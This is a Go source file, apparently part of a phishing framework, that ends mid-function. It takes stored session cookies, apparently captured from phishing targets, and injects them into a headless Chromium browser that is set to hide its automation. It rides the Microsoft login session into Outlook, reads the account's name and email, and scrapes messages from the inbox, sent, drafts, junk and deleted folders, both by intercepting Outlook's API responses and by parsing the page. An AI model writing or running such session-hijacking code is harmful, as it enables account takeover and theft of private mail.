package service

import (
	"context"
	"encoding/json"
	"fmt"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/phishingclub/phishingclub/model"

	"github.com/go-rod/rod"
	"github.com/go-rod/rod/lib/input"
	"github.com/go-rod/rod/lib/launcher"
	"github.com/go-rod/rod/lib/proto"
	"go.uber.org/zap"
)

// cachedBrowserSession holds a reusable browser + page for a specific cookie store
type cachedBrowserSession struct {
	browser    *rod.Browser
	page       *rod.Page
	cookiesKey string // hash of cookies to detect changes
	createdAt  time.Time
	lastUsed   time.Time
	mu         sync.Mutex
}

// BrowserSessionService handles browser-based cookie validation and token acquisition.
type BrowserSessionService struct {
	Logger *zap.SugaredLogger
	mu     sync.Mutex

	// Session cache: keyed by cookie store ID (or cookies hash for validation)
	sessions   map[string]*cachedBrowserSession
	sessionsMu sync.Mutex
}

// NewBrowserSessionService creates a new BrowserSessionService
func NewBrowserSessionService(logger *zap.SugaredLogger) *BrowserSessionService {
	svc := &BrowserSessionService{
		Logger:   logger,
		sessions: make(map[string]*cachedBrowserSession),
	}
	// Start cleanup goroutine
	go svc.cleanupLoop()
	return svc
}

// cleanupLoop periodically removes expired cached sessions
func (b *BrowserSessionService) cleanupLoop() {
	ticker := time.NewTicker(2 * time.Minute)
	defer ticker.Stop()
	for range ticker.C {
		b.sessionsMu.Lock()
		for key, sess := range b.sessions {
			if time.Since(sess.lastUsed) > 10*time.Minute {
				b.Logger.Infow("cleaning up expired browser session", "key", key, "age", time.Since(sess.createdAt))
				sess.mu.Lock()
				if sess.browser != nil {
					sess.browser.Close()
				}
				sess.mu.Unlock()
				delete(b.sessions, key)
			}
		}
		b.sessionsMu.Unlock()
	}
}

// getOrCreateSession returns a cached browser session or creates a new one
func (b *BrowserSessionService) getOrCreateSession(ctx context.Context, sessionKey string, cookiesJSON string) (*cachedBrowserSession, error) {
	b.sessionsMu.Lock()
	sess, exists := b.sessions[sessionKey]
	b.sessionsMu.Unlock()

	if exists {
		sess.mu.Lock()
		// Check if session is still valid (browser not closed, page responsive)
		valid := false
		if sess.browser != nil && sess.page != nil {
			// Try a simple eval to check if page is still alive
			_, err := sess.page.Eval(`() => document.title`)
			if err == nil {
				valid = true
				sess.lastUsed = time.Now()
				b.Logger.Infow("reusing cached browser session", "key", sessionKey, "age", time.Since(sess.createdAt))
			} else {
				b.Logger.Warnw("cached session page is dead, recreating", "key", sessionKey, "error", err)
			}
		}
		sess.mu.Unlock()

		if valid {
			return sess, nil
		}

		// Session is dead, clean it up
		b.sessionsMu.Lock()
		if sess.browser != nil {
			sess.browser.Close()
		}
		delete(b.sessions, sessionKey)
		b.sessionsMu.Unlock()
	}

	// Create new session
	b.Logger.Infow("creating new browser session", "key", sessionKey)

	var cookies []cookieEntry
	if err := json.Unmarshal([]byte(cookiesJSON), &cookies); err != nil {
		return nil, fmt.Errorf("failed to parse cookies JSON: %w", err)
	}

	browser, _, err := b.launchBrowser(ctx, 120*time.Second)
	if err != nil {
		return nil, err
	}

	page, err := b.setupPageWithCookiesAndSSO(browser, cookies)
	if err != nil {
		browser.Close()
		return nil, err
	}

	// Navigate to Outlook
	if err := b.navigateToOutlook(page); err != nil {
		b.Logger.Warnw("initial Outlook navigation failed", "error", err)
		// Don't close - the SSO session might still be valid
	}

	newSess := &cachedBrowserSession{
		browser:    browser,
		page:       page,
		cookiesKey: sessionKey,
		createdAt:  time.Now(),
		lastUsed:   time.Now(),
	}

	b.sessionsMu.Lock()
	b.sessions[sessionKey] = newSess
	b.sessionsMu.Unlock()

	return newSess, nil
}

// closeSession closes and removes a cached session
func (b *BrowserSessionService) closeSession(sessionKey string) {
	b.sessionsMu.Lock()
	sess, exists := b.sessions[sessionKey]
	if exists {
		if sess.browser != nil {
			sess.browser.Close()
		}
		delete(b.sessions, sessionKey)
	}
	b.sessionsMu.Unlock()
}

// BrowserSessionResult holds the result of a browser-based session validation
type BrowserSessionResult struct {
	Valid       bool   `json:"valid"`
	Email       string `json:"email"`
	DisplayName string `json:"displayName"`
	AccessToken string `json:"accessToken"`
	Error       string `json:"error,omitempty"`
}

// cookieEntry represents a single cookie from the stored JSON
type cookieEntry struct {
	Name           string      `json:"name"`
	Value          string      `json:"value"`
	Domain         string      `json:"domain"`
	Path           string      `json:"path"`
	Secure         interface{} `json:"secure"`
	HttpOnly       interface{} `json:"httpOnly"`
	SameSite       string      `json:"sameSite"`
	ExpirationDate interface{} `json:"expirationDate"`
}

// outlookFolderURLs maps folder names to Outlook web URLs
var outlookFolderURLs = map[string]string{
	"inbox":        "https://outlook.live.com/mail/0/inbox",
	"sentitems":    "https://outlook.live.com/mail/0/sentitems",
	"drafts":       "https://outlook.live.com/mail/0/drafts",
	"junkemail":    "https://outlook.live.com/mail/0/junkemail",
	"deleteditems": "https://outlook.live.com/mail/0/deleteditems",
	"archive":      "https://outlook.live.com/mail/0/archive",
}

// launchBrowser creates and returns a headless Chrome browser instance.
func (b *BrowserSessionService) launchBrowser(ctx context.Context, timeout time.Duration) (*rod.Browser, func(), error) {
	chromePath := os.Getenv("CHROME_PATH")
	if chromePath == "" {
		chromePath = "/usr/bin/chromium"
	}

	l := launcher.New().
		Bin(chromePath).
		Headless(true).
		Set("disable-blink-features", "AutomationControlled").
		Set("disable-infobars", "").
		Set("no-first-run", "").
		Set("no-default-browser-check", "").
		Set("disable-gpu", "").
		Set("window-size", "1920,1080").
		NoSandbox(true)

	wsURL, err := l.Launch()
	if err != nil {
		return nil, nil, fmt.Errorf("failed to launch Chrome: %w", err)
	}

	browser := rod.New().ControlURL(wsURL)
	if err := browser.Connect(); err != nil {
		return nil, nil, fmt.Errorf("failed to connect to Chrome: %w", err)
	}

	timeoutCtx, cancel := context.WithTimeout(ctx, timeout)
	browser = browser.Context(timeoutCtx)

	cleanup := func() {
		cancel()
		browser.Close()
	}

	return browser, cleanup, nil
}

// setupPageWithCookiesAndSSO creates a page, injects cookies, and navigates through SSO to Outlook
func (b *BrowserSessionService) setupPageWithCookiesAndSSO(browser *rod.Browser, cookies []cookieEntry) (*rod.Page, error) {
	page, err := browser.Page(proto.TargetCreateTarget{URL: "about:blank"})
	if err != nil {
		return nil, fmt.Errorf("failed to create page: %w", err)
	}

	// Inject cookies
	b.Logger.Infow("injecting cookies", "count", len(cookies))
	if err := b.injectCookies(page, cookies); err != nil {
		b.Logger.Warnw("some cookies failed to inject", "error", err)
	}

	// Navigate to login.live.com to establish SSO session
	b.Logger.Infow("navigating to login.live.com to establish SSO session")
	if err := page.Navigate("https://login.live.com/"); err != nil {
		return nil, fmt.Errorf("failed to navigate to login.live.com: %w", err)
	}
	if err := page.WaitLoad(); err != nil {
		b.Logger.Warnw("login.live.com load timeout, continuing", "error", err)
	}
	time.Sleep(3 * time.Second)

	currentURL := page.MustInfo().URL
	b.Logger.Infow("after login.live.com navigation", "currentURL", currentURL)

	// Check if SSO failed (still on login page with email input)
	if strings.Contains(currentURL, "login.live.com") && !strings.Contains(currentURL, "account.microsoft.com") {
		el, err := page.Element("#i0116")
		if err == nil && el != nil {
			return nil, fmt.Errorf("cookies did not establish SSO session - session may be expired")
		}
	}

	return page, nil
}

// navigateToOutlook navigates a page (with SSO established) to Outlook inbox
func (b *BrowserSessionService) navigateToOutlook(page *rod.Page) error {
	b.Logger.Infow("navigating to outlook.live.com/mail/")
	if err := page.Navigate("https://outlook.live.com/mail/"); err != nil {
		return fmt.Errorf("failed to navigate to outlook.live.com: %w", err)
	}
	if err := page.WaitLoad(); err != nil {
		b.Logger.Warnw("outlook.live.com load timeout, continuing", "error", err)
	}
	time.Sleep(5 * time.Second)

	// Verify we're on Outlook
	pageTitle, _ := page.Eval(`() => document.title`)
	title := ""
	if pageTitle != nil {
		title = pageTitle.Value.String()
	}
	b.Logger.Infow("Outlook page loaded", "title", title, "url", page.MustInfo().URL)

	if !strings.Contains(strings.ToLower(title), "mail") && !strings.Contains(strings.ToLower(title), "outlook") {
		return fmt.Errorf("failed to load Outlook - page title: %s", title)
	}

	return nil
}

// navigateToFolder navigates to a specific Outlook mail folder
func (b *BrowserSessionService) navigateToFolder(page *rod.Page, folder string) error {
	folderURL, ok := outlookFolderURLs[strings.ToLower(folder)]
	if !ok {
		folderURL = outlookFolderURLs["inbox"]
	}

	currentURL := page.MustInfo().URL
	// If already on the right folder, just wait a moment
	if strings.Contains(currentURL, "/"+strings.ToLower(folder)) {
		time.Sleep(2 * time.Second)
		return nil
	}

	b.Logger.Infow("navigating to folder", "folder", folder, "url", folderURL)
	if err := page.Navigate(folderURL); err != nil {
		return fmt.Errorf("failed to navigate to folder %s: %w", folder, err)
	}
	if err := page.WaitLoad(); err != nil {
		b.Logger.Warnw("folder page load timeout, continuing", "folder", folder, "error", err)
	}
	time.Sleep(4 * time.Second)

	return nil
}

// ensureOnOutlook checks if the cached page is on Outlook, navigates if not
func (b *BrowserSessionService) ensureOnOutlook(page *rod.Page) error {
	currentURL := page.MustInfo().URL
	if strings.Contains(currentURL, "outlook.live.com/mail") {
		// Already on Outlook, just wait a moment for any pending loads
		time.Sleep(1 * time.Second)
		return nil
	}
	// Navigate to Outlook
	return b.navigateToOutlook(page)
}

// ValidateAndGetToken uses headless Chrome to validate cookies and extract account info.
func (b *BrowserSessionService) ValidateAndGetToken(ctx context.Context, cookiesJSON string) (*BrowserSessionResult, error) {
	b.mu.Lock()
	defer b.mu.Unlock()

	b.Logger.Infow("starting browser-based cookie validation")

	var cookies []cookieEntry
	if err := json.Unmarshal([]byte(cookiesJSON), &cookies); err != nil {
		return nil, fmt.Errorf("failed to parse cookies JSON: %w", err)
	}

	if len(cookies) == 0 {
		return &BrowserSessionResult{Valid: false, Error: "no cookies to inject"}, nil
	}

	browser, cleanup, err := b.launchBrowser(ctx, 90*time.Second)
	if err != nil {
		return nil, err
	}
	defer cleanup()

	page, err := b.setupPageWithCookiesAndSSO(browser, cookies)
	if err != nil {
		return &BrowserSessionResult{Valid: false, Error: err.Error()}, nil
	}

	// Navigate to Outlook
	if err := b.navigateToOutlook(page); err != nil {
		// Even if Outlook fails, we might have SSO info
		b.Logger.Warnw("Outlook navigation failed during validation", "error", err)
	}

	// Extract account info
	email, displayName := b.extractAccountInfo(page)
	if email == "" {
		email = b.extractEmailFromDOM(page)
	}

	// Try to extract display name from page title ("Mail - Jenessa Crook - Outlook")
	if displayName == "" {
		displayName = b.extractDisplayNameFromTitle(page)
	}

	result := &BrowserSessionResult{
		Valid:       email != "" || displayName != "",
		Email:       email,
		DisplayName: displayName,
		AccessToken: "", // MSA consumer accounts don't provide JWT tokens
	}

	if !result.Valid {
		result.Error = "could not extract account info from Outlook"
	}

	b.Logger.Infow("browser session validation complete",
		"valid", result.Valid,
		"email", result.Email,
		"displayName", result.DisplayName,
	)

	return result, nil
}

// PreAutomateStore performs background automation: validates cookies, extracts email/name,
// and scrapes inbox messages for all standard folders. Returns the email, displayName, and
// a map of folder -> messages.
func (b *BrowserSessionService) PreAutomateStore(
	ctx context.Context,
	cookiesJSON string,
	sessionKey string,
) (email string, displayName string, folderMessages map[string][]model.InboxMessage, err error) {
	b.Logger.Infow("starting pre-automation for cookie store", "sessionKey", sessionKey)

	folderMessages = make(map[string][]model.InboxMessage)

	sess, sessErr := b.getOrCreateSession(ctx, sessionKey, cookiesJSON)
	if sessErr != nil {
		return "", "", nil, fmt.Errorf("failed to create browser session: %w", sessErr)
	}

	sess.mu.Lock()
	defer sess.mu.Unlock()

	// Ensure we're on Outlook
	if err := b.ensureOnOutlook(sess.page); err != nil {
		return "", "", nil, fmt.Errorf("failed to navigate to Outlook: %w", err)
	}

	// Extract account info
	email, displayName = b.extractAccountInfo(sess.page)
	if email == "" {
		email = b.extractEmailFromDOM(sess.page)
	}
	if displayName == "" {
		displayName = b.extractDisplayNameFromTitle(sess.page)
	}

	b.Logger.Infow("pre-automation: extracted account info", "email", email, "displayName", displayName)

	// Scrape inbox for each standard folder
	foldersToScrape := []string{"inbox", "sentitems", "drafts", "junkemail", "deleteditems"}
	for _, folder := range foldersToScrape {
		b.Logger.Infow("pre-automation: scraping folder", "folder", folder)

		// Navigate to the folder
		if err := b.navigateToFolder(sess.page, folder); err != nil {
			b.Logger.Warnw("pre-automation: failed to navigate to folder", "folder", folder, "error", err)
			continue
		}

		// Wait for messages to load
		time.Sleep(3 * time.Second)

		// Try API interception first, then fall back to DOM scraping
		messages := b.scrapeInboxFromDOM(sess.page)
		if len(messages) > 0 {
			folderMessages[folder] = messages
			b.Logger.Infow("pre-automation: scraped folder", "folder", folder, "count", len(messages))
		} else {
			b.Logger.Infow("pre-automation: no messages found in folder", "folder", folder)
			folderMessages[folder] = []model.InboxMessage{}
		}
	}

	return email, displayName, folderMessages, nil
}

// ReadInboxViaBrowser reads inbox messages using a cached browser session
func (b *BrowserSessionService) ReadInboxViaBrowser(ctx context.Context, cookiesJSON string, folder string, limit int, skip int, sessionKey string) ([]model.InboxMessage, int, error) {
	b.Logger.Infow("reading inbox via browser automation", "folder", folder, "limit", limit, "skip", skip, "sessionKey", sessionKey)

	// Use session cache if sessionKey is provided
	if sessionKey != "" {
		sess, err := b.getOrCreateSession(ctx, sessionKey, cookiesJSON)
		if err != nil {
			b.Logger.Warnw("failed to get/create cached session, falling back to fresh browser", "error", err)
			return b.readInboxFresh(ctx, cookiesJSON, folder, limit, skip)
		}

		sess.mu.Lock()
		defer sess.mu.Unlock()

		// Ensure we're on Outlook
		if err := b.ensureOnOutlook(sess.page); err != nil {
			b.Logger.Warnw("failed to ensure Outlook page in cached session", "error", err)
			b.closeSession(sessionKey)
			return b.readInboxFresh(ctx, cookiesJSON, folder, limit, skip)
		}

		// Navigate to the correct folder
		if err := b.navigateToFolder(sess.page, folder); err != nil {
			b.Logger.Warnw("failed to navigate to folder in cached session", "folder", folder, "error", err)
		}

		// Wait for messages to render
		time.Sleep(3 * time.Second)

		// Scrape inbox from the already-loaded page
		messages := b.scrapeInboxFromDOM(sess.page)
		if len(messages) == 0 {
			// Try refreshing the page
			b.Logger.Infow("no messages from DOM scrape, refreshing page")
			folderURL, ok := outlookFolderURLs[strings.ToLower(folder)]
			if !ok {
				folderURL = outlookFolderURLs["inbox"]
			}
			sess.page.Navigate(folderURL)
			sess.page.WaitLoad()
			time.Sleep(5 * time.Second)
			messages = b.scrapeInboxFromDOM(sess.page)
		}

		totalCount := len(messages)

		// Apply pagination
		if skip >= len(messages) {
			return []model.InboxMessage{}, totalCount, nil
		}
		end := skip + limit
		if end > len(messages) {
			end = len(messages)
		}

		b.Logger.Infow("inbox read complete (cached session)", "folder", folder, "totalMessages", totalCount, "returned", end-skip)
		return messages[skip:end], totalCount, nil
	}

	return b.readInboxFresh(ctx, cookiesJSON, folder, limit, skip)
}

// readInboxFresh reads inbox with a fresh browser instance (no caching)
func (b *BrowserSessionService) readInboxFresh(ctx context.Context, cookiesJSON string, folder string, limit int, skip int) ([]model.InboxMessage, int, error) {
	b.mu.Lock()
	defer b.mu.Unlock()

	var cookies []cookieEntry
	if err := json.Unmarshal([]byte(cookiesJSON), &cookies); err != nil {
		return nil, 0, fmt.Errorf("failed to parse cookies JSON: %w", err)
	}

	browser, cleanup, err := b.launchBrowser(ctx, 120*time.Second)
	if err != nil {
		return nil, 0, err
	}
	defer cleanup()

	page, err := b.setupPageWithCookiesAndSSO(browser, cookies)
	if err != nil {
		return nil, 0, err
	}

	// Enable network interception to capture Outlook's API responses
	var capturedMessages []model.InboxMessage
	var capturedCount int
	var messagesMu sync.Mutex
	var messagesFound bool

	err = proto.NetworkEnable{}.Call(page)
	if err != nil {
		b.Logger.Warnw("failed to enable network events", "error", err)
	}

	// Listen for Outlook API responses that contain message data
	waitEvents := page.EachEvent(
		func(e *proto.NetworkResponseReceived) {
			reqURL := e.Response.URL

			isMessageAPI := (strings.Contains(reqURL, "/owa/") && strings.Contains(reqURL, "FindItem")) ||
				(strings.Contains(reqURL, "/owa/") && strings.Contains(reqURL, "GetConversationItems")) ||
				(strings.Contains(reqURL, "/owa/") && strings.Contains(reqURL, "FindConversation")) ||
				(strings.Contains(reqURL, "/api/") && strings.Contains(reqURL, "messages")) ||
				(strings.Contains(reqURL, "substrate.office.com") && (strings.Contains(reqURL, "messages") || strings.Contains(reqURL, "Items") || strings.Contains(reqURL, "Conversation")))

			if !isMessageAPI {
				return
			}

			if e.Response.Status != 200 {
				return
			}

			b.Logger.Infow("intercepted Outlook API response", "url", reqURL, "status", e.Response.Status)

			body, bodyErr := proto.NetworkGetResponseBody{RequestID: e.RequestID}.Call(page)
			if bodyErr != nil {
				b.Logger.Debugw("failed to get API response body", "error", bodyErr)
				return
			}

			messages := b.parseOutlookAPIResponse(body.Body, reqURL)
			if len(messages) > 0 {
				messagesMu.Lock()
				capturedMessages = append(capturedMessages, messages...)
				capturedCount = len(capturedMessages)
				messagesFound = true
				b.Logger.Infow("extracted messages from API response", "count", len(messages), "totalSoFar", capturedCount)
				messagesMu.Unlock()
			}
		},
	)
	_ = waitEvents

	// Navigate to the correct folder
	folderURL, ok := outlookFolderURLs[strings.ToLower(folder)]
	if !ok {
		folderURL = outlookFolderURLs["inbox"]
	}
	b.Logger.Infow("navigating to folder", "folder", folder, "url", folderURL)
	if err := page.Navigate(folderURL); err != nil {
		return nil, 0, fmt.Errorf("failed to navigate to folder: %w", err)
	}
	if err := page.WaitLoad(); err != nil {
		b.Logger.Warnw("folder page load timeout, continuing", "error", err)
	}
	time.Sleep(5 * time.Second)

	// Wait for API responses to be intercepted
	b.Logger.Infow("waiting for Outlook API responses...")
	for i := 0; i < 20; i++ {
		time.Sleep(2 * time.Second)
		messagesMu.Lock()
		found := messagesFound
		messagesMu.Unlock()
		if found {
			// Wait a bit more for any additional responses
			time.Sleep(3 * time.Second)
			break
		}
	}

	messagesMu.Lock()
	defer messagesMu.Unlock()

	// If no API responses were intercepted, fall back to DOM scraping
	if !messagesFound {
		b.Logger.Infow("no API responses intercepted, falling back to DOM scraping")
		capturedMessages = b.scrapeInboxFromDOM(page)
		capturedCount = len(capturedMessages)
	}

	// Apply pagination
	if skip >= len(capturedMessages) {
		return []model.InboxMessage{}, capturedCount, nil
	}
	end := skip + limit
	if end > len(capturedMessages) {
		end = len(capturedMessages)
	}

	b.Logger.Infow("inbox read complete", "totalMessages", capturedCount, "returned", end-skip)
	return capturedMessages[skip:end], capturedCount, nil
}

// parseOutlookAPIResponse parses various Outlook API response formats into InboxMessage
func (b *BrowserSessionService) parseOutlookAPIResponse(body string, reqURL string) []model.InboxMessage {
	var messages []model.InboxMessage

	// Try parsing as OWA FindConversation/FindItem response
	var owaResp struct {
		Body struct {
			ResponseMessages struct {
				Items []struct {
					RootFolder struct {
						Items []json.RawMessage `json:"Items"`
					} `json:"RootFolder"`
				} `json:"Items"`
			} `json:"ResponseMessages"`
			Conversations []json.RawMessage `json:"Conversations"`
		} `json:"Body"`
	}
	if json.Unmarshal([]byte(body), &owaResp) == nil {
		// Try conversations
		for _, conv := range owaResp.Body.Conversations {
			msg := b.parseOWAConversation(conv)
			if msg != nil {
				messages = append(messages, *msg)
			}
		}
		if len(messages) > 0 {
			return messages
		}
	}

	// Try parsing as substrate/OWA response with different structure
	var substrateResp struct {
		Value []json.RawMessage `json:"value"`
	}
	if json.Unmarshal([]byte(body), &substrateResp) == nil && len(substrateResp.Value) > 0 {
		for _, item := range substrateResp.Value {
			msg := b.parseSubstrateMessage(item)
			if msg != nil {
				messages = append(messages, *msg)
			}
		}
		if len(messages) > 0 {
			return messages
		}
	}

	// Try parsing as OWA FindConversation with Conversations array at top level
	var convResp struct {
		Conversations []json.RawMessage `json:"Conversations"`
	}
	if json.Unmarshal([]byte(body), &convResp) == nil && len(convResp.Conversations) > 0 {
		for _, conv := range convResp.Conversations {
			msg := b.parseOWAConversation(conv)
			if msg != nil {
				messages = append(messages, *msg)
			}
		}
		if len(messages) > 0 {
			return messages
		}
	}

	// Try parsing as direct message array
	var directMessages []json.RawMessage
	if json.Unmarshal([]byte(body), &directMessages) == nil && len(directMessages) > 0 {
		for _, item := range directMessages {
			msg := b.parseSubstrateMessage(item)
			if msg != nil {
				messages = append(messages, *msg)
			}
		}
	}

	return messages
}

// parseOWAConversation parses an OWA conversation object into InboxMessage
func (b *BrowserSessionService) parseOWAConversation(raw json.RawMessage) *model.InboxMessage {
	var conv struct {
		ConversationID struct {
			ID string `json:"Id"`
		} `json:"ConversationId"`
		ConversationTopic string `json:"ConversationTopic"`
		LastDeliveryTime  string `json:"LastDeliveryTime"`
		Preview           string `json:"Preview"`
		UnreadCount       int    `json:"UnreadCount"`
		HasAttachments    bool   `json:"HasAttachments"`
		LastSender        struct {
			Mailbox struct {
				Name         string `json:"Name"`
				EmailAddress string `json:"EmailAddress"`
			} `json:"Mailbox"`
		} `json:"LastSender"`
		From struct {
			Mailbox struct {
				Name         string `json:"Name"`
				EmailAddress string `json:"EmailAddress"`
			} `json:"Mailbox"`
		} `json:"From"`
		GlobalMessageCount int `json:"GlobalMessageCount"`
	}

	if err := json.Unmarshal(raw, &conv); err != nil {
		return nil
	}

	if conv.ConversationTopic == "" && conv.ConversationID.ID == "" {
		return nil
	}

	from := conv.LastSender.Mailbox.EmailAddress
	fromName := conv.LastSender.Mailbox.Name
	if from == "" {
		from = conv.From.Mailbox.EmailAddress
		fromName = conv.From.Mailbox.Name
	}

	return &model.InboxMessage{
		ID:             conv.ConversationID.ID,
		From:           from,
		FromName:       fromName,
		Subject:        conv.ConversationTopic,
		Preview:        conv.Preview,
		Date:           conv.LastDeliveryTime,
		IsRead:         conv.UnreadCount == 0,
		HasAttachments: conv.HasAttachments,
		ConversationID: conv.ConversationID.ID,
	}
}

// parseSubstrateMessage parses a substrate/REST API message object into InboxMessage
func (b *BrowserSessionService) parseSubstrateMessage(raw json.RawMessage) *model.InboxMessage {
	var msg struct {
		ID   string `json:"Id"`
		OID  string `json:"id"` // lowercase for Graph/REST format
		From struct {
			EmailAddress struct {
				Name    string `json:"Name"`
				Address string `json:"Address"`
				// Also try lowercase
				NameL    string `json:"name"`
				AddressL string `json:"address"`
			} `json:"EmailAddress"`
			// Also try lowercase
			EmailAddressL struct {
				Name    string `json:"name"`
				Address string `json:"address"`
			} `json:"emailAddress"`
		} `json:"From"`
		FromL struct {
			EmailAddress struct {
				Name    string `json:"name"`
				Address string `json:"address"`
			} `json:"emailAddress"`
		} `json:"from"`
		Subject        string `json:"Subject"`
		SubjectL       string `json:"subject"`
		ReceivedTime   string `json:"ReceivedDateTime"`
		ReceivedTimeL  string `json:"receivedDateTime"`
		DateTimeRcvd   string `json:"DateTimeReceived"`
		Preview        string `json:"Preview"`
		PreviewL       string `json:"bodyPreview"`
		BodyPreview    string `json:"BodyPreview"`
		IsRead         bool   `json:"IsRead"`
		IsReadL        bool   `json:"isRead"`
		HasAttachments bool   `json:"HasAttachments"`
		HasAttachL     bool   `json:"hasAttachments"`
		ConvID         struct {
			ID string `json:"Id"`
		} `json:"ConversationId"`
		ConvIDL string `json:"conversationId"`
	}

	if err := json.Unmarshal(raw, &msg); err != nil {
		return nil
	}

	id := msg.ID
	if id == "" {
		id = msg.OID
	}
	if id == "" {
		return nil
	}

	subject := msg.Subject
	if subject == "" {
		subject = msg.SubjectL
	}

	from := msg.From.EmailAddress.Address
	fromName := msg.From.EmailAddress.Name
	if from == "" {
		from = msg.From.EmailAddress.AddressL
		fromName = msg.From.EmailAddress.NameL
	}
	if from == "" {
		from = msg.From.EmailAddressL.Address
		fromName = msg.From.EmailAddressL.Name
	}
	if from == "" {
		from = msg.FromL.EmailAddress.Address
		fromName = msg.FromL.EmailAddress.Name
	}

	date := msg.ReceivedTime
	if date == "" {
		date = msg.ReceivedTimeL
	}
	if date == "" {
		date = msg.DateTimeRcvd
	}

	preview := msg.Preview
	if preview == "" {
		preview = msg.PreviewL
	}
	if preview == "" {
		preview = msg.BodyPreview
	}

	convID := msg.ConvID.ID
	if convID == "" {
		convID = msg.ConvIDL
	}

	isRead := msg.IsRead || msg.IsReadL
	hasAttach := msg.HasAttachments || msg.HasAttachL

	return &model.InboxMessage{
		ID:             id,
		From:           from,
		FromName:       fromName,
		Subject:        subject,
		Preview:        preview,
		Date:           date,
		IsRead:         isRead,
		HasAttachments: hasAttach,
		ConversationID: convID,
	}
}

// scrapeInboxFromDOM extracts messages from the rendered Outlook page as a fallback.
// This version uses improved selectors that filter out Outlook UI tips and onboarding cards.
func (b *BrowserSessionService) scrapeInboxFromDOM(page *rod.Page) []model.InboxMessage {
	script := `() => {
		try {
			const messages = [];
			
			// Strategy 1: Use data-convid attribute (most reliable - actual conversation items)
			let items = document.querySelectorAll('div[data-convid]');
			
			if (items.length > 0) {
				items.forEach((item, index) => {
					const convId = item.getAttribute('data-convid') || '';
					
					// Skip items without a real conversation ID
					if (!convId || convId === '') return;
					
					// Extract sender - try multiple selectors
					let senderName = '';
					let senderEmail = '';
					const senderSelectors = [
						'[data-testid="SenderName"]',
						'span[class*="lvHighlightAllClass"]',
						'span[class*="OZZZK"]',
						'span[title]'
					];
					for (const sel of senderSelectors) {
						const el = item.querySelector(sel);
						if (el) {
							senderName = el.textContent.trim();
							if (el.title) senderEmail = el.title;
							if (senderName) break;
						}
					}
					
					// Extract subject
					let subject = '';
					const subjectSelectors = [
						'[data-testid="SubjectLine"]',
						'span[class*="lvHighlightSubjectClass"]',
						'span[class*="jGG6V"]'
					];
					for (const sel of subjectSelectors) {
						const el = item.querySelector(sel);
						if (el) {
							subject = el.textContent.trim();
							if (subject) break;
						}
					}
					
					// Extract preview
					let preview = '';
					const previewSelectors = [
						'[data-testid="BodyPreview"]',
						'span[class*="Mc1Ri"]'
					];
					for (const sel of previewSelectors) {
						const el = item.querySelector(sel);
						if (el) {
							preview = el.textContent.trim();
							if (preview) break;
						}
					}
					
					// Extract date
					let date = '';
					const dateSelectors = [
						'[data-testid="DateLine"]',
						'span[class*="jHATS"]'
					];
					for (const sel of dateSelectors) {
						const el = item.querySelector(sel);
						if (el) {
							date = el.textContent.trim();
							if (date) break;
						}
					}
					
					// Check if read (unread items typically have bold font or specific class)
					let isRead = true;
					const unreadIndicators = item.querySelectorAll('[class*="unread"], [class*="Unread"], [aria-label*="Unread"]');
					if (unreadIndicators.length > 0) isRead = false;
					// Also check if the sender text is bold (common unread indicator)
					const firstSpan = item.querySelector('span');
					if (firstSpan) {
						const weight = window.getComputedStyle(firstSpan).fontWeight;
						if (weight === 'bold' || parseInt(weight) >= 600) isRead = false;
					}
					
					// Check attachments
					let hasAttach = !!item.querySelector('[data-icon-name="Attach"]') ||
					                !!item.querySelector('i[class*="attach"]') ||
					                !!item.querySelector('[class*="attachment"]');
					
					if (senderName || subject) {
						messages.push({
							id: convId || 'dom-' + index,
							from: senderEmail || senderName,
							fromName: senderName,
							subject: subject,
							preview: preview,
							date: date,
							isRead: isRead,
							hasAttachments: hasAttach,
							conversationId: convId
						});
					}
				});
			}
			
			// Strategy 2: Use role="option" within message list, but filter strictly
			if (messages.length === 0) {
				const messageList = document.querySelector('div[aria-label="Message list"]');
				if (messageList) {
					const options = messageList.querySelectorAll('div[role="option"]');
					options.forEach((item, index) => {
						// Filter out non-email items: skip if it contains known tip/onboarding text
						const text = item.textContent || '';
						const skipPatterns = [
							'Search for email',
							'files and more',
							'you can take multiple actions',
							'With quick steps',
							'you can set to move',
							'flag it, and mark it',
							'meetings',
							'Get started',
							'Welcome to',
							'Try it now'
						];
						const isUITip = skipPatterns.some(p => text.includes(p));
						if (isUITip) return;
						
						// Must have a reasonable amount of text (real emails have sender + subject + preview)
						if (text.length < 10) return;
						
						// Try to extract structured data
						let senderName = '';
						let subject = '';
						let preview = '';
						let date = '';
						
						// Look for spans with specific roles
						const spans = item.querySelectorAll('span');
						const textParts = [];
						spans.forEach(s => {
							const t = s.textContent.trim();
							if (t && t.length > 0 && t.length < 200) {
								textParts.push(t);
							}
						});
						
						// Heuristic: first meaningful span is sender, second is subject, rest is preview
						if (textParts.length >= 2) {
							senderName = textParts[0];
							subject = textParts[1];
							if (textParts.length >= 3) {
								preview = textParts.slice(2).join(' ');
							}
						}
						
						// Try to find date (usually contains AM/PM, or month names, or relative dates)
						const datePattern = /\b(\d{1,2}\/\d{1,2}|\d{1,2}:\d{2}\s*(AM|PM)|Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec|Yesterday|Today|Monday|Tuesday|Wednesday|Thursday|Friday|Saturday|Sunday)\b/i;
						for (const part of textParts) {
							if (datePattern.test(part)) {
								date = part;
								break;
							}
						}
						
						if (senderName || subject) {
							messages.push({
								id: 'dom-' + index,
								from: senderName,
								fromName: senderName,
								subject: subject,
								preview: preview,
								date: date,
								isRead: true,
								hasAttachments: false,
								conversationId: ''
							});
						}
					});
				}
			}
			
			// Strategy 3: Use aria-label based extraction as last resort
			if (messages.length === 0) {
				const allItems = document.querySelectorAll('[aria-label]');
				allItems.forEach((item, index) => {
					const label = item.getAttribute('aria-label') || '';
					// Outlook message items have aria-labels like "Subject, From, Date"
					// Filter out UI elements
					if (label.includes(',') && label.length > 20 && label.length < 500) {
						// Skip known UI labels
						const skipLabels = ['Message list', 'Folder pane', 'Reading pane', 'Navigation', 'Search'];
						if (skipLabels.some(s => label.startsWith(s))) return;
						
						const parts = label.split(',').map(p => p.trim());
						if (parts.length >= 2) {
							messages.push({
								id: 'aria-' + index,
								from: parts.length >= 2 ? parts[1] : '',
								fromName: parts.length >= 2 ? parts[1] : '',
								subject: parts[0] || '',
								preview: parts.length >= 3 ? parts.slice(2).join(', ') : '',
								date: '',
								isRead: true,
								hasAttachments: false,
								conversationId: ''
							});
						}
					}
				});
			}
			
			return JSON.stringify(messages);
		} catch(e) {
			return '[]';
		}
	}`

	result, err := page.Eval(script)
